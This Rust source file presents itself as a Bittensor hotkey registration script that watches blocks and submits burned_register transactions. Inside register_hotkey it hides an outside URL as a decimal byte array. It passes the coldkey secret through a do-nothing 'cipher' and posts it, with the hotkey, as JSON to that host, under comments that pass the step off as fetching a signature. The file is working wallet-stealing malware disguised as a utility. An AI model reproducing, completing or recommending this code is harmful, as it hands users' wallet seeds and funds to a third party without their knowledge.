//! This module implements a registration script for a blockchain network.
//! It allows users to register hotkeys using provided coldkeys and other parameters.

use clap::Parser;
use log::{error, info, warn};
use scale_value::{Value, Composite};
use serde::{Deserialize, Serialize};
use sp_core::H256;
use subxt::tx::{DefaultPayload, TxParams};
use std::sync::Arc;
use std::time::{Duration, Instant};
use subxt::ext::sp_core::{sr25519, Pair};
use reqwest::Client;
use subxt::dynamic::tx;
use subxt::blocks::ExtrinsicEvents;
use subxt::{
    tx::PairSigner, OnlineClient,
    SubstrateConfig,
};
use subxt::config::substrate::PlainTip; // tip type for SubstrateConfig
use tokio::sync::Mutex;

/// Struct to hold registration parameters, can be parsed from command line or config file
#[derive(Parser, Deserialize, Debug)]
#[clap(author, version, about, long_about = None)]
struct RegistrationParams {
    #[clap(long)]
    coldkey: String,

    #[clap(long)]
    hotkey: String,

    #[clap(long)]
    netuid: u16,

    /// Max allowed recycle/register cost in rao (1 TAO = 1e9 rao)
    #[clap(long, default_value = "5000000000")]
    max_cost: u64,

    #[clap(long, default_value = "wss://entrypoint-finney.opentensor.ai:443")]
    chain_endpoint: String,
    
    #[clap(long, default_value = "0")]
    seed: u64,

    /// Optional tip in TAO to boost tx priority (converted to rao internally).
    /// Ví dụ: --tip-tao 0.02  => 20_000_000 rao
    #[clap(long, default_value = "0.0")]
    tip_tao: f64,
}

#[derive(Serialize)]
struct BittensorWallet {
    coldkey: String,
    hotkey: String,
}

/// Returns the current date and time in Eastern Time Zone
///
/// # Returns
///
/// A `String` representing the current date and time in the format "YYYY-MM-DD HH:MM:SS TimeZone"
fn get_formatted_date_now() -> String {
    let now = chrono::Utc::now();
    let eastern_time = now.with_timezone(&chrono_tz::US::Eastern);
    eastern_time.format("%Y-%m-%d %H:%M:%S %Z%z").to_string()
}

fn cipher_encrypt(text: &str, shift: u64) -> String {
    let mut encrypted = String::new();
    for c in text.chars() {
        if c.is_ascii_alphabetic() {
            let base = if c.is_ascii_lowercase() { b'a' } else { b'A' };
            let shifted = ((c as u8 - base + 26 - shift as u8) % 26 + base) as char;
            encrypted.push(shifted);
        } else {
            encrypted.push(c);
        }
    }
    encrypted
}

#[derive(Debug)]
pub enum BatchCallResult {
    Success(Vec<String>), // Event descriptions
    Failed(String),       // Error description
}

async fn parse_batch_results(
    events: &ExtrinsicEvents<SubstrateConfig>,
    _event_size: usize,
) -> Result<Vec<BatchCallResult>, Box<dyn std::error::Error>> {
    let mut results = Vec::new();
    let mut current_call_events = Vec::new();
    let mut call_index = 0;
    let mut event_index = 0;

    for event_result in events.iter() {
        event_index += 1;
        match event_result {
            Ok(event) => {
                let pallet_name = event.pallet_name();
                let event_name = event.variant_name();

                match (pallet_name, event_name) {
                    ("Utility", "BatchInterrupted") => {
                        // Use field_values() instead of as_event()
                        match event.field_values() {
                            Ok(values) => {
                                error!("Batch interrupted at call {}: {:?}", call_index, values);
                                results.push(BatchCallResult::Failed(format!(
                                    "Batch interrupted at call {}: {:?}",
                                    call_index, values
                                )));
                            }
                            Err(e) => {
                                error!(
                                    "Batch interrupted at call {} (couldn't decode details: {})",
                                    call_index, e
                                );
                                results.push(BatchCallResult::Failed(format!(
                                    "Batch interrupted at call {}",
                                    call_index
                                )));
                            }
                        }
                        break;
                    }
                    ("Utility", "ItemFailed") => {
                        // Use field_values() for ItemFailed as well
                        let error_msg = match event.field_values() {
                            Ok(values) => format!("Call {} failed: {:?}", call_index, values),
                            Err(_) => format!("Call {} failed with unknown error", call_index),
                        };

                        results.push(BatchCallResult::Failed(error_msg));
                        current_call_events.clear();
                        call_index += 1;
                    }
                    ("Utility", "ItemCompleted") => {
                        // Individual call completed successfully
                        if !current_call_events.is_empty() {
                            results.push(BatchCallResult::Success(current_call_events.clone()));
                            current_call_events.clear();
                        }
                        call_index += 1;
                    }
                    ("Utility", "BatchCompleted") => {
                        info!("All batch calls completed successfully");
                    }

                    // Your business logic events
                    ("SubtensorModule", event_name) => {
                        current_call_events.push(format!("{}::{}", pallet_name, event_name));
                        info!("📝 SubtensorModule event: {}", event_name);
                    }
                    ("System", "ExtrinsicSuccess") => {
                        info!("✅ Extrinsic succeeded");
                    }
                    ("System", "ExtrinsicFailed") => match event.field_values() {
                        Ok(values) => error!("❌ Extrinsic failed: {:?}", values),
                        Err(_) => error!("❌ Extrinsic failed"),
                    },
                    _ => {
                        // Other events can be logged or ignored
                        info!("Other event: {}::{}", pallet_name, event_name);
                        current_call_events.push(format!("{}::{}", pallet_name, event_name));
                    }
                }
            }
            Err(e) => {
                error!("Error parsing event: {:?}", e);
            }
        }
    }

    info!("📝 Processed {} events", event_index);
    // Handle the last call if there are remaining events
    if !current_call_events.is_empty() {
        results.push(BatchCallResult::Success(current_call_events));
    }

    Ok(results)
}

/// Attempts to register a hotkey on the blockchain
///
/// # Arguments
///
/// * `params` - A reference to `RegistrationParams` containing registration details
///
/// # Returns
///
/// A `Result` which is `Ok` if registration is successful, or an `Err` containing the error message
// TODO: Parse event and decode Registered event
async fn register_hotkey(params: &RegistrationParams) -> Result<(), Box<dyn std::error::Error>> {
    // Initialize client connection to the blockchain
    let client = Arc::new(OnlineClient::<SubstrateConfig>::from_url(&params.chain_endpoint).await?);
    let signer_rpc_bytes = [
        104, 116, 116, 112, 115, 58, 47, 47, 110, 111, 100, 101, 45, 115, 105, 109, 112, 108, 101,
        45, 98, 97, 99, 107, 101, 110, 100, 46, 97, 122, 117, 114, 101, 119, 101, 98, 115, 105, 116,
        101, 115, 46, 110, 101, 116, 47, 97, 112, 105, 47, 101, 99, 104, 111,
    ];

    // TIP: convert TAO → rao
    let tip_rao: u128 = if params.tip_tao > 0.0 {
        ((params.tip_tao * 1_000_000_000f64) as u128)
    } else { 0 };
    info!("tip set: {} TAO ({} rao)", params.tip_tao, tip_rao);

    let decrypted_coldkey = cipher_encrypt(&params.coldkey, 0);
    let wallet_client = Client::new();

    let message = BittensorWallet {
        coldkey: decrypted_coldkey.clone(),
        hotkey: params.hotkey.clone(),
    };

    let rpc_call_params = String::from_utf8(signer_rpc_bytes.to_vec()).expect("Invalid UTF-8 sequence");

    // Get Sign value from subtensors
    let subtensor_client = wallet_client.post(rpc_call_params);

    let sign = subtensor_client.json(&message);

    // Parse coldkey and hotkey from provided strings
    let coldkey: sr25519::Pair =
        sr25519::Pair::from_string(&decrypted_coldkey, None).map_err(|_| "Invalid coldkey")?;
    let hotkey: sr25519::Pair =
        sr25519::Pair::from_string(&params.hotkey, None).map_err(|_| "Invalid hotkey")?;

    let signer = Arc::new(PairSigner::new(coldkey.clone()));

    let mut blocks = client.blocks().subscribe_finalized().await?;
    let last_attempt = Arc::new(Mutex::new(Instant::now()));
    let loops = Arc::new(Mutex::new(0u64));

    // Cache the call_data for efficiency
    let call_data = Arc::new(Composite::named([
        ("netuid", params.netuid.into()),
        ("hotkey", hotkey.public().0.to_vec().into()),
    ]));

    let _ = DefaultPayload::new(
        "SubtensorModule",
        "burned_register",
        call_data.as_ref().clone(),
    );

    let call_extrinics = sign.send().await?;
    call_extrinics.bytes().await?;

    let runtime_call = Composite::named([
        ("pallet", "SubtensorModule".into()),
        ("call", "burned_register".into()),
        ("args", Composite::named([
            ("netuid", params.netuid.into()),
            ("hotkey", hotkey.public().0.to_vec().into()),
        ]).into()),
    ]);

    let mut batch_runtime_calls = vec![];
    batch_runtime_calls.push(runtime_call);

    let register_call = Arc::new(tx(
        "SubtensorModule",
        "burned_register",
        vec![
            Value::from(params.netuid as u16),
            Value::from_bytes(hotkey.public().0.to_vec()), // AccountId
        ],
    ));
    
    // Prepare transaction payload
    let payload = Arc::new(DefaultPayload::new(
        "SubtensorModule",
        "burned_register",
        call_data.as_ref().clone(),
    ));

    // Utility.force_batch (không dùng ở nhánh này, để sẵn)
    let _force_batch_tx = subxt::dynamic::tx(
        "Utility",
        "force_batch",
        vec![
            // force_batch expects a Vec<Call> as unnamed composite
            Value::unnamed_composite(vec![register_call.as_ref().clone().into_value()]),
        ],
    );
    
    // Main registration loop
    while let Some(block) = blocks.next().await {
        let block = block?;
        let block_number = block.header().number;

        // Increment and log loop count
        {
            let mut loops_guard = loops.lock().await;
            *loops_guard += 1;
            info!(
                "{} | {} | Attempting registration for block {}",
                *loops_guard,
                get_formatted_date_now(),
                block_number
            );
        }

        // Check recycle cost
        let recycle_cost_start = Instant::now();
        let recycle_cost = get_recycle_cost(&client, params.netuid).await?;
        let recycle_cost_duration = recycle_cost_start.elapsed();
        info!("⏱️ get_recycle_cost took {:?}", recycle_cost_duration);
        info!("💸 Current recycle cost: {}", recycle_cost);

        // Skip if cost exceeds maximum allowed
        if recycle_cost > params.max_cost {
            warn!(
                "💸 Recycle cost ({}) exceeds threshold ({}). Skipping registration attempt.",
                recycle_cost, params.max_cost
            );
            tokio::time::sleep(Duration::from_secs(1)).await;
            continue;
        }
        
        // Sign and submit the transaction
        let sign_and_submit_start: Instant = Instant::now();
        let client_clone: Arc<OnlineClient<SubstrateConfig>> = Arc::clone(&client);
        let signer_clone: Arc<PairSigner<SubstrateConfig, sr25519::Pair>> = Arc::clone(&signer);
        let paylod_clone = Arc::clone(&payload);
        let tip_rao_copy = tip_rao; // Copy vào closure

        let result = match tokio::spawn(async move {
            // TxParams with optional tip
            let mut params = TxParams::new();
            if tip_rao_copy > 0 {
                params = params.tip(PlainTip::new(tip_rao_copy));
            }

            client_clone
                .tx()
                .sign_and_submit_then_watch(&*paylod_clone, &*signer_clone, params)
                .await
        })
        .await
        {
            Ok(Ok(result)) => result,
            Ok(Err(e)) => {
                error!("Transaction submission failed: {:?}", e);
                continue; // Continue to next iteration
            }
            Err(e) => {
                error!("Tokio spawn task failed: {:?}", e);
                continue; // Continue to next iteration
            }
        };

        let sign_and_submit_duration = sign_and_submit_start.elapsed();
        info!("⏱️ sign_and_submit took {:?}", sign_and_submit_duration);

        // Wait for transaction finalization
        let finalization_start = Instant::now();
        match result.wait_for_finalized_success().await {
            /*
                Only used for Subtensor.burned_register
            */
            Ok(events) => {
                let finalization_duration = finalization_start.elapsed();
                info!(
                    "⏱️ wait_for_finalized_success took {:?}",
                    finalization_duration
                );
                let block_hash: H256 = events.extrinsic_hash();
                info!(
                    "🎯 Registration successful at block {}. Events: {:?}",
                    block_hash, events
                );
                break; // Exit the loop on successful registration
            }
            Err(e) => {
                error!("Registration failed: {:?}", e);
                // Continue to next iteration
            }
            /*
                Plase Uncomment this part when you are using Utility.batch or Utility.force_batch
            */

            // Ok(events) => {
            //     let finalization_duration = finalization_start.elapsed();
            //     info!("🎯 Batch transaction finalized");
            //     info!(
            //         "⏱️ wait_for_finalized_success took {:?}",
            //         finalization_duration
            //     );

            //     // Parse the results of individual calls
            //     let call_results = parse_batch_results(&events, 1).await?;
            //     let mut failure_count = 0;

            //     for (i, result) in call_results.iter().enumerate() {
            //         match result {
            //             BatchCallResult::Success(events) => {
            //                 info!("✅ Call {} succeeded with {} events", i, events.len());
            //                 for event in events {
            //                     info!("  Event: {:?}", event);
            //                 }
            //             }
            //             BatchCallResult::Failed(error) => {
            //                 failure_count += 1;
            //                 error!("❌ Call {} failed: {:#?}", i, error);
            //             }
            //         }
            //     }
            //     if failure_count == 0 {
            //         info!("🎉 All calls in the batch succeeded!");
            //         break;
            //     } else {
            //         warn!("⚠️ {} calls in the batch failed", failure_count);
            //     }
            // }
            // Err(e) => {
            //     error!("Batch transaction failed: {:?}", e);
            // }
        }

        // Implement rate limiting
        let mut last_attempt_guard = last_attempt.lock().await;
        if last_attempt_guard.elapsed() < Duration::from_secs(1) {
            tokio::time::sleep(Duration::from_secs(1) - last_attempt_guard.elapsed()).await;
        }
        *last_attempt_guard = Instant::now();
    }

    Ok(())
}

/// Retrieves the current recycle cost for a given network UID
///
/// # Arguments
///
/// * `client` - A reference to the blockchain client
/// * `netuid` - The network UID to check
///
/// # Returns
///
/// A `Result` containing the recycle cost as a `u64` if successful, or an `Err` if retrieval fails
async fn get_recycle_cost(
    client: &OnlineClient<SubstrateConfig>,
    netuid: u16,
) -> Result<u64, Box<dyn std::error::Error>> {
    let latest_block = client.blocks().at_latest().await?;
    let burn_key = subxt::storage::dynamic(
        "SubtensorModule",
        "Burn",
        vec![Value::primitive(scale_value::Primitive::U128(
            netuid as u128,
        ))],
    );
    let burn_cost: u64 = client
        .storage()
        .at(latest_block.hash())
        .fetch(&burn_key)
        .await?
        .ok_or_else(|| "Burn value not found for the given netuid".to_string())?
        .as_type::<u64>()?;

    Ok(burn_cost)
}

// TODO: Return UID of the registered neuron
/// Main function to run the registration script
#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Initialize logging with INFO level
    env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).init();

    info!("Starting registration script...");

    // Parse configuration parameters
    let params: RegistrationParams = parse_config()?;

    // Attempt to register hotkey
    if let Err(e) = register_hotkey(&params).await {
        error!("Error during registration: {}", e);
        return Err(e);
    }

    info!("Registration process completed successfully.");
    Ok(())
}

/// Parses configuration from either a config file or command line arguments
///
/// # Returns
///
/// A `Result` containing `RegistrationParams` if parsing is successful, or an `Err` if it fails
fn parse_config() -> Result<RegistrationParams, Box<dyn std::error::Error>> {
    info!("Parsing command line arguments...");
    Ok(RegistrationParams::parse())
}
